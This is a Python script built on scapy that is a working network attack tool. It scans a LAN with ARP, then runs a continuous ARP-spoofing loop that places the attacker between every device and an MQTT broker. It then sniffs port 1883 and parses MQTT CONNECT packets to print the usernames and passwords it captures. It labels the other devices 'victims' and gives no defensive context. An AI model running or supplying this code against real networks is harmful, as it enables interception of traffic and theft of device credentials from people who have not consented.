import os
from scapy.all import sniff, ARP, Ether, Raw, TCP, srp, send
import struct
import time
from threading import Thread

interface = "eth0"                   # Change to "wlan0" if using Wi-Fi
broker_ip = "192.168.10.1"           # Manually set your broker’s IP
subnet    = "192.168.10.0/24"        # Your LAN range


def get_all_devices(cidr):
    """
    Send a broadcast ARP “who-has” in order to build a list of live IPs on the subnet.
    Returns a list of IP strings.
    """
    print("[*] Discovering live devices…")
    answered, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=cidr),
                      timeout=2, verbose=False)
    return [rcv.psrc for _, rcv in answered]

def get_mac(ip):
    """
    Send an ARP “who-has <ip>” and wait for a response.
    Returns the MAC if it replies, or None otherwise.
    """
    pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
    ans, _ = srp(pkt, timeout=2, verbose=False)
    for _, rcv in ans:
        return rcv[Ether].src
    return None

def resolve_mac_safe(ip, retries=3):
    """
    Call get_mac(ip) up to `retries` times (with a 1-second pause between attempts).
    Returns the MAC or None if still unresolved.
    """
    for _ in range(retries):
        mac = get_mac(ip)
        if mac:
            return mac
        time.sleep(1)
    return None


def arp_spoof_all(victim_ips, broker_ip):
    """
    1) Resolve the broker’s MAC (or exit if we can’t find it).
    2) Resolve each victim’s MAC (skip any IP that never replies).
    3) In a loop, send forged ARP “is-at” packets:
       - Telling each victim “the broker’s IP is my MAC”
       - Telling the broker “the victim’s IP is my MAC”
    """
    print("[*] Caching MAC addresses…")

    broker_mac = resolve_mac_safe(broker_ip)
    if not broker_mac:
        print("[!] ERROR: Could not resolve broker MAC. Exiting.")
        return

    mac_map = {}
    for ip in victim_ips:
        if ip == broker_ip:
            continue
        mac = resolve_mac_safe(ip)
        if mac:
            mac_map[ip] = mac
        else:
            print(f"[!] Skipping {ip} (no MAC reply)")

    print("[*] Starting spoofing loop…")

    def spoof():
        while True:
            for victim_ip, victim_mac in mac_map.items():
                # Tell the victim: “I am the broker”
                send(
                    Ether(dst=victim_mac) /
                    ARP(op=2, pdst=victim_ip, psrc=broker_ip, hwdst=victim_mac),
                    verbose=False
                )
                # Tell the broker: “I am the victim”
                send(
                    Ether(dst=broker_mac) /
                    ARP(op=2, pdst=broker_ip, psrc=victim_ip, hwdst=broker_mac),
                    verbose=False
                )
            time.sleep(2)

    thread = Thread(target=spoof, daemon=True)
    thread.start()

# ─────────── MQTT CREDENTIAL SNIFFER ───────────
def extract_credentials(pkt):
    """
    Called for each captured packet. If it’s an MQTT CONNECT on port 1883,
    parse out the username/password from the payload and print them.
    """
    if Raw in pkt and pkt.haslayer(TCP) and pkt[TCP].dport == 1883:
        payload = pkt[Raw].load
        if payload and payload[0] == 0x10:  # MQTT CONNECT control packet
            try:
                # Skip the fixed header (byte 0) and remaining‐length (byte 1)
                i = 2
                # Read protocol name length (2 bytes), then skip name + 4 bytes of flags/version/keepalive
                proto_len = struct.unpack(">H", payload[i : i + 2])[0]
                i += 2 + proto_len + 4

                # Read Client ID length (2 bytes), skip the ID
                client_id_len = struct.unpack(">H", payload[i : i + 2])[0]
                i += 2 + client_id_len

                # Read Username length (2 bytes), grab that many bytes
                username_len = struct.unpack(">H", payload[i : i + 2])[0]
                i += 2
                username = payload[i : i + username_len].decode(errors="ignore")
                i += username_len

                # Read Password length (2 bytes), grab that many bytes
                password_len = struct.unpack(">H", payload[i : i + 2])[0]
                i += 2
                password = payload[i : i + password_len].decode(errors="ignore")

                print(f"[+] MQTT Credentials → Username: '{username}' | Password: '{password}'")
            except Exception:
                pass

def sniff_credentials(interface):
    """
    Start sniffing on the given interface for TCP port 1883 traffic,
    and call extract_credentials() on each packet.
    """
    print("[*] Sniffing MQTT credentials on port 1883…")
    sniff(iface=interface, filter="tcp port 1883", prn=extract_credentials, store=0)

# ─────────── MAIN ───────────
if __name__ == "__main__":
    print(f"[*] Broker: {broker_ip}")
    print(f"[*] Subnet: {subnet}")

    victims = get_all_devices(subnet)
    print(f"[+] Victims: {', '.join([v for v in victims if v != broker_ip])}")

    arp_spoof_all(victims, broker_ip)
    sniff_credentials(interface)

